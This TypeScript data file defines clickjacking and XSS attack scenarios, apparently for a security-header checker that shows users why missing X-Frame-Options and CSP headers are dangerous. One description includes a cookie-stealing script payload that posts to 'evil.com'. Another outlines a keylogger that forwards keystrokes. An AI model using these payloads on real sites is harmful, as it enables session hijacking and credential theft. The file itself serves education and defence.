export interface AttackScenario {
  id: string;
  name: string;
  attackerObjective: string;
  objectiveSeverity: "critical" | "high";
  description: string;
  howItWorks: string;
  simulationType: "clickjacking" | "xss-terminal";
}

export const SCENARIO_MAP: Record<string, AttackScenario[]> = {
  "missing-x-frame-options": [
    {
      id: "clickjacking-lottery",
      name: "Fake Lottery Bait",
      attackerObjective: "Credential Theft / Unauthorized Action",
      objectiveSeverity: "critical",
      description:
        "A fake \"You Won!\" prize notification overlays the target site. When the victim clicks \"Claim Prize\" they unknowingly trigger a real authenticated action — payment, account deletion, or data change — on the legitimate page beneath.",
      howItWorks:
        "The target page sits in a transparent iframe aligned so its critical button sits directly under the decoy button. One click triggers the real form submission in the victim's active authenticated session.",
      simulationType: "clickjacking",
    },
    {
      id: "clickjacking-video",
      name: "Fake Video Play Button",
      attackerObjective: "One-Click Form Submission / CSRF",
      objectiveSeverity: "high",
      description:
        "A professional-looking video player thumbnail covers the target page. The play button is pixel-aligned over a critical \"Submit\", \"Transfer\", or \"Confirm\" button on the underlying real site.",
      howItWorks:
        "Victim sees a compelling video preview. One click on the ▶ play button actually clicks the real form submit underneath, performing an irreversible action in their authenticated session without any visible feedback.",
      simulationType: "clickjacking",
    },
  ],
  "missing-csp": [
    {
      id: "xss-session-theft",
      name: "Session Cookie Exfiltration",
      attackerObjective: "Authentication Token Theft",
      objectiveSeverity: "critical",
      description:
        "Without Content-Security-Policy, any injected <script> tag executes freely in the page's origin. This simulation shows an attacker reading all session cookies and shipping them to a remote collection server in a single fetch().",
      howItWorks:
        "Payload: <script>fetch('//evil.com?c='+btoa(document.cookie))</script>. With no script-src policy, the browser executes this in the full origin context — reading every cookie, token, and credential stored for that site.",
      simulationType: "xss-terminal",
    },
    {
      id: "xss-keylogger",
      name: "Keylogger Injection",
      attackerObjective: "Real-Time Credential Capture",
      objectiveSeverity: "critical",
      description:
        "An injected keylogger script hooks the keyboard event listener and silently forwards every keystroke — passwords, credit card numbers, PINs — to the attacker's endpoint. The victim sees nothing.",
      howItWorks:
        "Payload injects document.addEventListener('keydown', fn). Each character is buffered and POSTed every 5 seconds to an attacker-controlled API. Captures passwords even before form submission.",
      simulationType: "xss-terminal",
    },
  ],
};
